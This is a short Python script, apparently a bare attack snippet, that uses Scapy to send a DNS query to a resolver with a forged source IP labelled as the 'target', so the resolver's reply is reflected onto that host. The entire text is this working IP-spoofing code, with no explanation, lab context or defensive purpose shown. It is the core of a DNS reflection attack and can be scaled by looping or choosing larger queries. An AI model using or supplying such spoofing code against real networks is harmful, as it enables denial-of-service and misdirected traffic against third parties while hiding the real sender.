from scapy.all import * 
target_ip = "192.168.2.3" 
dns_server_ip = "192.168.2.1" 
spoofed_packet = IP(dst=dns_server_ip, src=target_ip) / UDP(dport=53, sport=12345) / DNS(rd=1, qd=DNSQR(qname="www.google.com")) 
send(spoofed_packet)
